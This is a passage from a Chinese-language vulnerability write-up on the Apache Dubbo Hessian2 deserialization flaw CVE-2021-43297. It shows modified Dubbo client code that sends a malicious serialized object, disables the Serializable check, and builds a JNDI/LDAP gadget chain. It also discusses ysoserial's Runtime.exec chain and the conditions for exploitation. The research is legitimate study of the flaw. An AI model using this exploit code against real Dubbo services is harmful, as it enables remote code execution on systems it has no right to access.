                if (4096 > 8));
                    buffer[offset++] = (byte) length;
                } else {
                    buffer[offset++] = 83;
                    buffer[offset++] = (byte) (length >> 8);
                    buffer[offset++] = (byte) length;
                }
                if (!value.startsWith("2.")) {
                    this._offset = offset;
                    this.printString(value, strOffset, length);
                }
            }
        }
重写`org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#encodeRequestData(org.apache.dubbo.remoting.Channel,
org.apache.dubbo.common.serialize.ObjectOutput, java.lang.Object,
java.lang.String)`:
    protected void encodeRequestData(Channel channel, ObjectOutput out, Object data, String version) throws IOException {
            RpcInvocation inv = (RpcInvocation) data;
            out.writeUTF(version);
            out.writeObject(Test.getObject());//写入恶意对象，在expect中readObject的对象
        }
重写`org.apache.dubbo.registry.zookeeper.ZookeeperRegistry#doSubscribe`：
    public void doSubscribe(final URL url, final NotifyListener listener) {
            try {
                String path;
                if ("*".equals(url.getServiceInterface())) {
                    String root = this.toRootPath();
                    ConcurrentMap listeners = (ConcurrentMap) this.zkListeners.computeIfAbsent(url, (k) -> {
                        return new ConcurrentHashMap();
                    });
                    ChildListener zkListener = (ChildListener) listeners.computeIfAbsent(listener, (k) -> {
                        return (parentPath, currentChilds) -> {
                            Iterator var5 = currentChilds.iterator();
                            while (var5.hasNext()) {
                                String child = (String) var5.next();
                                child = URL.decode(child);
                                if (!this.anyServices.contains(child)) {
                                    this.anyServices.add(child);
                                    this.subscribe(url.setPath(child).addParameters(new String[]{"interface", child, "check", String.valueOf(false)}), k);
                                }
                            }
                        };
                    });
                    this.zkClient.create(root, false);
                    List services = this.zkClient.addChildListener(root, zkListener);
                    if (CollectionUtils.isNotEmpty(services)) {
                        Iterator var7 = services.iterator();
                        while (var7.hasNext()) {
                            path = (String) var7.next();
                            path = URL.decode(path);
                            this.anyServices.add(path);
                            this.subscribe(url.setPath(path).addParameters(new String[]{"interface", path, "check", String.valueOf(false)}), listener);
                        }
                    }
                } else {
                    CountDownLatch latch = new CountDownLatch(1);
                    List urls = new ArrayList();
                    String[] var15 = this.toCategoriesPath(url);
                    int var16 = var15.length;
                    for (int var17 = 0; var17  listeners = (ConcurrentMap) this.zkListeners.computeIfAbsent(url, (k) -> {
                            return new ConcurrentHashMap();
                        });
                        ChildListener zkListener = (ChildListener) listeners.computeIfAbsent(listener, (k) -> {
                            return new ZookeeperRegistry.RegistryChildListenerImpl(url, k, latch);
                        });
                        if (zkListener instanceof ZookeeperRegistry.RegistryChildListenerImpl) {
                            ((ZookeeperRegistry.RegistryChildListenerImpl) zkListener).setLatch(latch);
                        }
                        this.zkClient.create(path, false);
                        List children = this.zkClient.addChildListener(path, zkListener);
                        if (children != null) {
                            urls.addAll(this.toUrlsWithEmpty(url, path, children));
                        }
                    }
                    URL url1 = URL.valueOf(String.format("dubbo://%s:%s/%s?anyhost=true&application=demo-provider&default=true&deprecated=false&dubbo=2.0.2&dynamic=true&generic=false&interface=%s&metadata-type=remote&methods=ccc,ddd&pid=111&release=2.7.14&service.name=ServiceBean:/111.222&side=provider&timestamp=111&token=aaa", BasicConsumer.targetHost, BasicConsumer.targetPort, BasicConsumer.anyInterface, BasicConsumer.anyInterface));//重写了这里，因为我们不知道目标的接口，zoomkeeper与目标服务通信之后，不会返回目标的ip和端口，所以这里的前提就是如果你不知道目标暴露的接口服务，那么需要知道目标服务的ip和port
                    urls.set(0, url1);
                    this.notify(url, listener, urls);
                    latch.countDown();
                }
            } catch (Throwable var12) {
                throw new RpcException("Failed to subscribe " + url + " to zookeeper " + this.getUrl() + ", cause: " + var12.getMessage(), var12);
            }
        }
重写`com.alibaba.com.caucho.hessian.io.SerializerFactory#getDefaultSerializer`：
    protected Serializer getDefaultSerializer(Class cl) {
            this._isAllowNonSerializable = true;//默认是不允许序列化没有继承Serializable的类，但是神奇的是这只是本地的校验，关闭即可，服务端根本没有校验类需要继承Serializable
            if (this._defaultSerializer != null) {
                return this._defaultSerializer;
            } else if (!Serializable.class.isAssignableFrom(cl) && !this._isAllowNonSerializable) {
                throw new IllegalStateException("Serialized class " + cl.getName() + " must implement java.io.Serializable");
            } else {
                return new JavaSerializer(cl, this._loader);
            }
        }
以上的demo代码放到[github](https://github.com/longofo/Apache-Dubbo-Hessian2-CVE-2021-43297)了，有兴趣的可以测试下。
#### toString调用链构造注意事项
在marshalsec工具中，提供了对于Hessian反序列化可利用的几条链：
  * Rome
  * XBean
  * Resin
  * SpringPartiallyComparableAdvisorHolder
  * SpringAbstractBeanFactoryPointcutAdvisor
不过有的链被拉到了黑名单了，或者需要一些三方包。
之前看到过jdk中其实有个toString的利用链：
    javax.swing.MultiUIDefaults.toString
                UIDefaults.get
                    UIDefaults.getFromHashTable
                        UIDefaults$LazyValue.createValue
                        SwingLazyValue.createValue
                            javax.naming.InitialContext.doLookup()
    UIDefaults uiDefaults = new UIDefaults();
    uiDefaults.put("aaa", new SwingLazyValue("javax.naming.InitialContext", "doLookup", new Object[]{"ldap://127.0.0.1:6666"}));
    Class aClass = Class.forName("javax.swing.MultiUIDefaults");
    Constructor declaredConstructor = aClass.getDeclaredConstructor(UIDefaults[].class);
    declaredConstructor.setAccessible(true);
    o = declaredConstructor.newInstance(new Object[]{new UIDefaults[]{uiDefaults}});
经过测试，发现没法使用：
  * javax.swing.MultiUIDefaults是peotect类，只能在javax.swing.中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限
  * 所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功
然后对于存在Map类型的利用链，例如ysoserial中的cc5部分：
    TiedMapEntry.toString()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                InvokerTransformer.transform()
                    Method.invoke()
                        Class.getMethod()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.getRuntime()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()
这个也是无法利用的，因为Hessian2在恢复map类型的对象时，硬编码成了HashMap或者TreeMap，这里LazeMap就断了。
扫了下basic项目自带的包，没找到能用的链，三方包中找到利用链的可能性比较大一些。
### 利用条件
对于上面这个basic项目，使用zoomkeeper作为注册中心，要利用需要的条件如下：
  * 知道目标服务的ip&port，不需要知道zoomkeeper注册中心的地址，上面测试项目中使用的是这种样例，可以看到在客户端代码中，我没有用服务端提供的接口而是随便写的一个，依然可以成功利用
  * 或者需要知道zoomkeeper的ip&port+一个目标的interface接口名称（因为先和zoomkeeper通信，如果没有提供正确的接口名称，他不会返回目标的ip和port信息，如果你知道目标的一个interface接口，那么就可以借助zoomkeeper拿到目标的ip和port，总之和zoomkeeper通信的目的也是拿到目标的ip和port）
  * 一个toString利用链
## 最后
从这个漏洞可以学到以下两点：
  * 类似Hessian2这种反序列化组件，如果要发现类似的漏洞，可以把他们的核心处理类比如Hessian2的Hessian2Input的所有readXXX方法作为source
  * 畸形数据有时候构造不容易，可以考虑从客户端代码转换
* * *